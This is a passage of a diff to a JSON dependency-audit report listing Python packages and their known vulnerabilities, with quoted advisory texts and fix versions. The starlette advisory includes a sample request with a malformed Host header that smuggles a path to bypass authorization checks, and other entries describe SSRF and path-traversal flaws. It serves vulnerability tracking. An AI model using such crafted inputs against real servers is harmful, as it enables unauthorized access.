+          "description": "PyJWT is a JSON Web Token implementation in Python. Prior to 2.13.0, when the verifier is decoding JSON Web Tokens, while supporting both asymmetric and HMAC algorithms, the library does not validate use of JSON Web Keys in HMAC algorithm, allowing attacker to use the issuer public key as the secret key for HMAC algorithm. This vulnerability is fixed in 2.13.0."
+        },
+        {
+          "id": "PYSEC-2026-175",
+          "fix_versions": [
+            "2.13.0"
+          ],
+          "aliases": [
+            "GHSA-993g-76c3-p5m4",
+            "CVE-2026-48522"
+          ],
+          "description": "PyJWT is a JSON Web Token implementation in Python. Prior to 2.13.0, PyJWKClient passes its uri argument directly to urllib.request.urlopen() which uses Python stdlib's default OpenerDirector registering HTTPHandler, HTTPSHandler, FTPHandler, FileHandler, and DataHandler. There is currently no documented option to restrict which schemes PyJWKClient will fetch. If an application's jku URL ingestion path accepts attacker-influenced URLs (e.g., from JWT header, configuration file, OAuth flow parameter), the attacker can cause PyJWKClient to read arbitrary local files via file:// (SSRF on local filesystem), cause PyJWKClient to attempt FTP / data-URI fetches (broader SSRF surface), or forge tokens that PyJWT verifies as valid. The library does not directly return non-HTTP(S) URI contents to the attacker; the chained \"plant a JWKS to forge tokens\" scenario described in the original report requires additional application-layer flaws (attacker write access to a filesystem path, untrusted jku derivation) that this fix does not address. This vulnerability is fixed in 2.13.0."
+        },
+        {
+          "id": "PYSEC-2026-177",
+          "fix_versions": [
+            "2.13.0"
+          ],
+          "aliases": [
+            "CVE-2026-48524",
+            "GHSA-fhv5-28vv-h8m8"
+          ],
+          "description": "PyJWT is a JSON Web Token implementation in Python. Prior to 2.13.0, PyJWKClient.get_signing_key() forces a fresh HTTP request to the JWKS endpoint for every JWT with an unknown kid value, with no rate limiting. Since kid comes from the unverified token header, an attacker can trigger unlimited outbound requests. The vulnerability surfaces only when a JWKS fetch fails; an attacker can attempt to provoke that with sustained unknown-kid traffic, but the outcome depends on upstream JWKS-endpoint behavior (rate limiting, transient errors) which is beyond the attacker's control. This vulnerability is fixed in 2.13.0."
+        },
+        {
+          "id": "PYSEC-2026-178",
+          "fix_versions": [
+            "2.13.0"
+          ],
+          "aliases": [
+            "CVE-2026-48525",
+            "GHSA-w7vc-732c-9m39"
+          ],
+          "description": "PyJWT is a JSON Web Token implementation in Python. From 2.8.0 to 2.12.1, when verifying detached JWS tokens using the unencoded-payload option (\"b64\": false, RFC 7797), PyJWT performs Base64URL decoding of the compact-serialization payload segment before enforcing the detached-payload rules. For b64=false, PyJWT later discards that decoded payload and replaces it with the caller-provided detached_payload. In practice, this turns the middle segment into an attacker-controlled “work amplifier”: a remote client can supply an arbitrarily large Base64URL payload segment that forces CPU work + memory allocations even if the signature is invalid. This creates an unauthenticated DoS vector against any endpoint that verifies detached JWS using PyJWT. This vulnerability is fixed in 2.13.0."
         }
       ]
     },
     {
-      "name": "jinja2",
-      "version": "2.11.2",
+      "name": "pyparsing",
+      "version": "3.3.2",
+      "vulns": []
+    },
+    {
+      "name": "python-dateutil",
+      "version": "2.9.0.post0",
+      "vulns": []
+    },
+    {
+      "name": "python-dotenv",
+      "version": "1.2.2",
+      "vulns": []
+    },
+    {
+      "name": "python-multipart",
+      "version": "0.0.22",
       "vulns": [
         {
-          "id": "SSTI-JINJA2",
-          "fix_versions": ["3.1.0"],
-          "description": "Possível Server-Side Template Injection."
+          "id": "CVE-2026-40347",
+          "fix_versions": [
+            "0.0.26"
+          ],
+          "aliases": [
+            "GHSA-mj87-hwqh-73pj"
+          ],
+          "description": "### Summary  A denial of service vulnerability exists when parsing crafted `multipart/form-data` requests with large preamble or epilogue sections.  ### Details  Two inefficient multipart parsing paths could be abused with attacker-controlled input.  Before the first multipart boundary, the parser handled leading CR and LF bytes inefficiently while searching for the start of the first part. After the closing boundary, the parser continued processing trailing epilogue data instead of discarding it immediately. As a result, parsing time could grow with the size of crafted data placed before the first boundary or after the closing boundary.  ### Impact  An attacker can send oversized malformed multipart bodies that consume excessive CPU time during request parsing, reducing request-handling capacity and delaying legitimate requests. This issue degrades availability but does not typically result in a complete denial of service for the entire application.  ### Mitigation  Upgrade to version `0.0.26` or later, which skips ahead to the next boundary candidate when processing leading CR/LF data and immediately discards epilogue data after the closing boundary."
+        },
+        {
+          "id": "CVE-2026-42561",
+          "fix_versions": [
+            "0.0.27"
+          ],
+          "aliases": [
+            "GHSA-pp6c-gr5w-3c5g"
+          ],
+          "description": "### Summary  `python-multipart` has a denial of service vulnerability in multipart part header parsing. When parsing `multipart/form-data`, `MultipartParser` previously had no limit on the number of part headers or the size of an individual part header. An attacker could send a request with either many repeated headers without terminating the header block or a single very large header value, causing excessive CPU work before request rejection or completion.  ### Impact  Applications that parse attacker-controlled `multipart/form-data` with affected versions of `python-multipart` can experience CPU exhaustion. ASGI applications using Starlette, FastAPI, or other frameworks that invoke `python-multipart` may have worker or event-loop delays while processing malicious upload requests.  ### Details  The affected parser states are `HEADER_FIELD_START`, `HEADER_FIELD`, `HEADER_VALUE_START`, `HEADER_VALUE`, and `HEADER_VALUE_ALMOST_DONE`. The issue can be triggered by:  - A multipart part with an oversized individual header value. - A multipart part with many repeated header lines or an unterminated header block.  Both variants are addressed by enforcing default parser limits for maximum header count and maximum header size.  ### Mitigation  Upgrade to `python-multipart` `0.0.27` or later.  If upgrading is not immediately possible, reduce exposure by enforcing request body size limits at the server, proxy, or framework layer. This is only a mitigation; affected versions of `python-multipart` still parse multipart part headers without the default header count and header size limits."
         }
       ]
+    },
+    {
+      "name": "python-whois",
+      "version": "0.9.6",
+      "vulns": []
+    },
+    {
+      "name": "pytz",
+      "version": "2026.1.post1",
+      "vulns": []
+    },
+    {
+      "name": "pywin32",
+      "version": "311",
+      "vulns": []
+    },
+    {
+      "name": "pyyaml",
+      "version": "6.0.3",
+      "vulns": []
+    },
+    {
+      "name": "referencing",
+      "version": "0.37.0",
+      "vulns": []
+    },
+    {
+      "name": "regex",
+      "version": "2026.5.9",
+      "vulns": []
+    },
+    {
+      "name": "reportlab",
+      "version": "4.5.1",
+      "vulns": []
+    },
+    {
+      "name": "requests",
+      "version": "2.33.0",
+      "vulns": []
+    },
+    {
+      "name": "requests-file",
+      "version": "3.0.1",
+      "vulns": []
+    },
+    {
+      "name": "rich",
+      "version": "14.3.3",
+      "vulns": []
+    },
+    {
+      "name": "rpds-py",
+      "version": "0.30.0",
+      "vulns": []
+    },
+    {
+      "name": "ruamel-yaml",
+      "version": "0.19.1",
+      "vulns": []
+    },
+    {
+      "name": "ruamel-yaml-clib",
+      "version": "0.2.14",
+      "vulns": []
+    },
+    {
+      "name": "safety",
+      "version": "3.8.1",
+      "vulns": []
+    },
+    {
+      "name": "safety-schemas",
+      "version": "0.0.16",
+      "vulns": []
+    },
+    {
+      "name": "semantic-version",
+      "version": "2.10.0",
+      "vulns": []
+    },
+    {
+      "name": "semgrep",
+      "version": "1.156.0",
+      "vulns": []
+    },
+    {
+      "name": "setuptools",
+      "version": "65.5.0",
+      "vulns": [
+        {
+          "id": "PYSEC-2022-43012",
+          "fix_versions": [
+            "65.5.1"
+          ],
+          "aliases": [
+            "CVE-2022-40897",
+            "BIT-setuptools-2022-40897",
+            "GHSA-r9hx-vwmv-q579"
+          ],
+          "description": "Python Packaging Authority (PyPA)'s setuptools is a library designed to facilitate packaging Python projects. Setuptools version 65.5.0 and earlier could allow remote attackers to cause a denial of service by fetching malicious HTML from a PyPI package or custom PackageIndex page due to a vulnerable Regular Expression in `package_index`. This has been patched in version 65.5.1."
+        },
+        {
+          "id": "PYSEC-2022-43012",
+          "fix_versions": [
+            "65.5.1"
+          ],
+          "aliases": [
+            "CVE-2022-40897",
+            "GHSA-r9hx-vwmv-q579",
+            "BIT-setuptools-2022-40897"
+          ],
+          "description": "Python Packaging Authority (PyPA) setuptools before 65.5.1 allows remote attackers to cause a denial of service via HTML in a crafted package or custom PackageIndex page. There is a Regular Expression Denial of Service (ReDoS) in package_index.py."
+        },
+        {
+          "id": "PYSEC-2025-49",
+          "fix_versions": [
+            "78.1.1"
+          ],
+          "aliases": [
+            "GHSA-5rjg-fvgr-3xxf",
+            "CVE-2025-47273",
+            "BIT-setuptools-2025-47273"
+          ],
+          "description": "### Summary  A path traversal vulnerability in `PackageIndex` was fixed in setuptools version 78.1.1  ### Details ```     def _download_url(self, url, tmpdir):         # Determine download filename         #         name, _fragment = egg_info_for_url(url)         if name:             while '..' in name:                 name = name.replace('..', '.').replace('\\\\', '_')         else:             name = \"__downloaded__\"  # default if URL has no path contents          if name.endswith('.[egg.zip](http://egg.zip/)'):             name = name[:-4]  # strip the extra .zip before download   -->       filename = os.path.join(tmpdir, name) ```  Here: https://github.com/pypa/setuptools/blob/6ead555c5fb29bc57fe6105b1bffc163f56fd558/setuptools/package_index.py#L810C1-L825C88  `os.path.join()` discards the first argument `tmpdir` if the second begins with a slash or drive letter. `name` is derived from a URL without sufficient sanitization. While there is some attempt to sanitize by replacing instances of '..' with '.', it is insufficient.  ### Risk Assessment As easy_install and package_index are deprecated, the exploitation surface is reduced. However, it seems this could be exploited in a similar fashion like https://github.com/advisories/GHSA-r9hx-vwmv-q579, and as described by POC 4 in https://github.com/advisories/GHSA-cx63-2mw6-8hw5 report: via malicious URLs present on the pages of a package index.  ### Impact An attacker would be allowed to write files to arbitrary locations on the filesystem with the permissions of the process running the Python code, which could escalate to RCE depending on the context.  ### References https://huntr.com/bounties/d6362117-ad57-4e83-951f-b8141c6e7ca5 https://github.com/pypa/setuptools/issues/4946"
+        },
+        {
+          "id": "PYSEC-2025-49",
+          "fix_versions": [
+            "78.1.1"
+          ],
+          "aliases": [
+            "GHSA-5rjg-fvgr-3xxf",
+            "CVE-2025-47273"
+          ],
+          "description": "setuptools is a package that allows users to download, build, install, upgrade, and uninstall Python packages. A path traversal vulnerability in `PackageIndex` is present in setuptools prior to version 78.1.1. An attacker would be allowed to write files to arbitrary locations on the filesystem with the permissions of the process running the Python code, which could escalate to remote code execution depending on the context. Version 78.1.1 fixes the issue."
+        },
+        {
+          "id": "CVE-2024-6345",
+          "fix_versions": [
+            "70.0.0"
+          ],
+          "aliases": [
+            "GHSA-cx63-2mw6-8hw5",
+            "BIT-setuptools-2024-6345"
+          ],
+          "description": "A vulnerability in the `package_index` module of pypa/setuptools versions up to 69.1.1 allows for remote code execution via its download functions. These functions, which are used to download packages from URLs provided by users or retrieved from package index servers, are susceptible to code injection. If these functions are exposed to user-controlled inputs, such as package URLs, they can execute arbitrary commands on the system. The issue is fixed in version 70.0."
+        }
+      ]
+    },
+    {
+      "name": "shellingham",
+      "version": "1.5.4",
+      "vulns": []
+    },
+    {
+      "name": "six",
+      "version": "1.17.0",
+      "vulns": []
+    },
+    {
+      "name": "smmap",
+      "version": "5.0.3",
+      "vulns": []
+    },
+    {
+      "name": "sniffio",
+      "version": "1.3.1",
+      "vulns": []
+    },
+    {
+      "name": "sortedcontainers",
+      "version": "2.4.0",
+      "vulns": []
+    },
+    {
+      "name": "sse-starlette",
+      "version": "3.3.3",
+      "vulns": []
+    },
+    {
+      "name": "starlette",
+      "version": "1.0.0",
+      "vulns": [
+        {
+          "id": "PYSEC-2026-161",
+          "fix_versions": [
+            "1.0.1"
+          ],
+          "aliases": [
+            "CVE-2026-48710",
+            "GHSA-86qp-5c8j-p5mr",
+            "X41-2026-002"
+          ],
+          "description": "Starlette reconstructs the requested URL based on the HTTP Host request header and requested path, but does not perform any validation of the Host header value. This allows attackers to inject paths into the host part, prepending the actual path. However, routing in Starlette is based on the actual request path. This inconsistent interpretation of HTTP requests may lead to issues such as authentication bypass when the authentication depends on the reconstructed URL’s path."
+        },
+        {
+          "id": "PYSEC-2026-161",
+          "fix_versions": [
+            "1.0.1"
+          ],
+          "aliases": [
+            "CVE-2026-48710",
+            "GHSA-86qp-5c8j-p5mr",
+            "X41-2026-002"
+          ],
+          "description": "### Summary In affected versions, the HTTP `Host` request header was not validated before being used to reconstruct `request.url`. Because the routing algorithm relies on the raw HTTP path while `request.url` is rebuilt from the `Host` header, a malformed header could make `request.url.path` differ from the path that was actually requested. Middleware and endpoints that apply security restrictions based on `request.url` (rather than the raw `scope` path) could therefore be bypassed.  ### Details When a client requests `http://example.com/foo`, it sends:  ```http GET /foo HTTP/1.1 Host: example.com ```  Affected versions reconstructed the URL by concatenating `http://{host}{path}` and re-parsing the result. The `Host` value is only valid as a `uri-host [ \":\" port ]` per [RFC 9112 §3.2](https://www.rfc-editor.org/rfc/rfc9112.html#section-3.2-6), where `uri-host` follows the restricted `host` grammar of [RFC 3986 §3.2.2](https://www.rfc-editor.org/rfc/rfc3986.html#section-3.2.2). When it contains characters outside that grammar - notably `/`, `?`, or `#` - those characters move the path/query/fragment boundaries during re-parsing, so the parsed `request.url.path` no longer matches the path the server actually received. For example:  ```http GET /foo HTTP/1.1 Host: example.com/abc?bar= ```  reconstructs to `http://example.com/abc?bar=/foo`, whose parsed `path` is `/abc` - even though routing used the real path `/foo`. The router still dispatches to `/foo` and the endpoint executes, but any middleware or code that reads `request.url.path` sees `/abc`, so path-based authorization checks can be bypassed.  ### Impact Any application running an affected version that relies on `request.url` (or `request.url.path`) for security-sensitive decisions is affected. The most common case is middleware that gates access to certain path prefixes based on `request.url.path`. Deployments fronted by a proxy or load balancer are mitigated only if that proxy rejects or normalizes the malformed `Host` header before forwarding and the application does not trust attacker-controlled host headers (e.g. `X-Forwarded-Host`) elsewhere.  ### Mitigation Upgrade to a patched version, which validates the `Host` header against the grammar of [RFC 9112 §3.2](https://www.rfc-editor.org/rfc/rfc9112.html#section-3.2-6) / [RFC 3986 §3.2.2](https://www.rfc-editor.org/rfc/rfc3986.html#section-3.2.2) when constructing `request.url` and falls back to `scope[\"server\"]` for malformed values."
+        }
+      ]
+    },
+    {
+      "name": "stevedore",
+      "version": "5.7.0",
+      "vulns": []
+    },
+    {
+      "name": "streamlit",
+      "version": "1.55.0",
+      "vulns": []
+    },
+    {
+      "name": "tenacity",
+      "version": "9.1.4",
+      "vulns": []
+    },
+    {
+      "name": "tldextract",
+      "version": "5.3.1",
+      "vulns": []
+    },
+    {
+      "name": "toml",
+      "version": "0.10.2",
+      "vulns": []
+    },
+    {
+      "name": "tomli",
+      "version": "2.4.1",
+      "vulns": []
+    },
+    {
+      "name": "tomli-w",
+      "version": "1.2.0",
+      "vulns": []
+    },
+    {
+      "name": "tomlkit",
+      "version": "0.15.0",
+      "vulns": []
+    },
+    {
+      "name": "tornado",
+      "version": "6.5.5",
+      "vulns": [
+        {
+          "id": "CVE-2026-49854",
+          "fix_versions": [
+            "6.5.6"
+          ],
+          "aliases": [
+            "GHSA-cx3h-4qpv-8hc9"
+          ],
+          "description": "### Summary  Tornado's optional native extension `tornado.speedups` implements `websocket_mask` without validating that the `mask` argument is exactly four bytes long. The C function reads four bytes from `mask` unconditionally, even when Python passes a shorter byte string. This can read beyond the provided buffer, exposing up to 3 bytes of uninitialized memory.  The behavior is reachable from Tornado's XSRF token decoder when `xsrf_cookies=True` and the native extension is active.   ### Mitigations  This bug is fixed in Tornado 6.5.6. Prior to upgrading to this version, setting the environment variable TORNADO_EXTENSION=0 will disable the vulnerable code (at the expense of reducing websocket performance)."
+        }
+      ]
+    },
+    {
+      "name": "tqdm",
+      "version": "4.67.3",
+      "vulns": []
+    },
+    {
+      "name": "truststore",
+      "version": "0.10.4",
+      "vulns": []
+    },
+    {
+      "name": "typer",
+      "version": "0.25.1",
+      "vulns": []
+    },
+    {
+      "name": "typing-extensions",
+      "version": "4.15.0",
+      "vulns": []
+    },
+    {
+      "name": "typing-inspection",
+      "version": "0.4.2",
+      "vulns": []
+    },
+    {
+      "name": "tzdata",
+      "version": "2025.3",
+      "vulns": []
+    },
+    {
+      "name": "uritemplate",
+      "version": "4.2.0",
+      "vulns": []
+    },
+    {
+      "name": "urllib3",
+      "version": "2.6.3",
+      "vulns": [
+        {
+          "id": "PYSEC-2026-142",
+          "fix_versions": [
+            "2.7.0"
+          ],
+          "aliases": [
+            "GHSA-mf9v-mfxr-j63j",
+            "CVE-2026-44432"
+          ],
+          "description": "### Impact  urllib3's [streaming API](https://urllib3.readthedocs.io/en/2.7.0/advanced-usage.html#streaming-and-i-o) is designed for the efficient handling of large HTTP responses by reading the content in chunks, rather than loading the entire response body into memory at once.  urllib3 can perform decompression based on the HTTP `Content-Encoding` header (e.g., `gzip`, `deflate`, `br`, or `zstd`). When using the streaming API since version 2.6.0, the library decompresses only the necessary bytes, enabling partial content consumption.  However, urllib3 before version 2.7.0 could still decompress the whole response instead of the requested portion in two cases: 1. During the second `HTTPResponse.read(amt=N)` call when the response was decompressed using the official [Brotli](https://pypi.org/project/brotli/) library. 2. When `HTTPResponse.drain_conn()` was called after the response had been read and decompressed partially (compression algorithm did not matter here).  These issues could cause urllib3 to fully decode a small amount of highly compressed data in a single operation. This could result in excessive resource consumption (high CPU usage and massive memory allocation for the decompressed data; CWE-409) on the client side.   ### Affected usages  Applications and libraries using urllib3 versions earlier than 2.7.0 may be affected when streaming compressed responses from untrusted sources in either of these cases, unless decompression is explicitly disabled:  1. A response encoded with `br` is read incrementally with at least two `HTTPResponse.read(amt=N)` or `HTTPResponse.stream(amt=N)` calls while using the official [Brotli](https://pypi.org/project/brotli/) library. 2. `HTTPResponse.drain_conn()` is called after response decompression has already started.   ### Remediation  Upgrade to at least urllib3 version 2.7.0 in which the library: 1. Is more efficient for reads with Brotli. 2. Always skips decompression for `HTTPResponse.drain_conn()`.  If upgrading is not immediately possible, the following workarounds may reduce exposure in specific cases: 1. For the Brotli-specific issue only, switch from [brotli](https://pypi.org/project/brotli/) to [brotlicffi](https://pypi.org/project/brotlicffi/) until you can upgrade urllib3; the official Brotli package is affected because of https://github.com/google/brotli/issues/1396. 2. If your code explicitly calls `HTTPResponse.drain_conn()`, call `HTTPResponse.close()` instead when connection reuse is not important.   ### Credits  The Brotli-specific issue was reported by @kimkou2024. `HTTPResponse.drain_conn()` inefficiency was reported by @Cycloctane."
+        },
+        {
+          "id": "PYSEC-2026-142",
+          "fix_versions": [
+            "2.7.0"
+          ],
+          "aliases": [
+            "GHSA-mf9v-mfxr-j63j",
+            "CVE-2026-44432"
+          ],
+          "description": "urllib3 is an HTTP client library for Python. From 2.6.0 to before 2.7.0, urllib3 could decompress the whole response instead of the requested portion (1) during the second HTTPResponse.read(amt=N) call when the response was decompressed using the official Brotli library or (2) when HTTPResponse.drain_conn() was called after the response had been read and decompressed partially (compression algorithm did not matter here). These issues could cause urllib3 to fully decode a small amount of highly compressed data in a single operation. This could result in excessive resource consumption (high CPU usage and massive memory allocation for the decompressed data) on the client side. This vulnerability is fixed in 2.7.0."
+        },
+        {
+          "id": "PYSEC-2026-141",
+          "fix_versions": [
+            "2.7.0"
+          ],
+          "aliases": [
+            "GHSA-qccp-gfcp-xxvc",
+            "CVE-2026-44431"
+          ],
+          "description": "urllib3 is an HTTP client library for Python. From 1.23 to before 2.7.0, cross-origin redirects followed from the low-level API via ProxyManager.connection_from_url().urlopen(..., assert_same_host=False) still forward these sensitive headers. This vulnerability is fixed in 2.7.0."
+        }
+      ]
+    },
+    {
+      "name": "uvicorn",
+      "version": "0.42.0",
+      "vulns": []
+    },
+    {
+      "name": "watchdog",
+      "version": "6.0.0",
+      "vulns": []
+    },
+    {
+      "name": "wcmatch",
+      "version": "8.5.2",
+      "vulns": []
+    },
+    {
+      "name": "websockets",
+      "version": "16.0",
+      "vulns": []
+    },
+    {
+      "name": "wrapt",
+      "version": "1.17.3",
+      "vulns": []
+    },
+    {
+      "name": "zipp",
+      "version": "3.23.0",
+      "vulns": []
     }
   ],
   "fixes": []
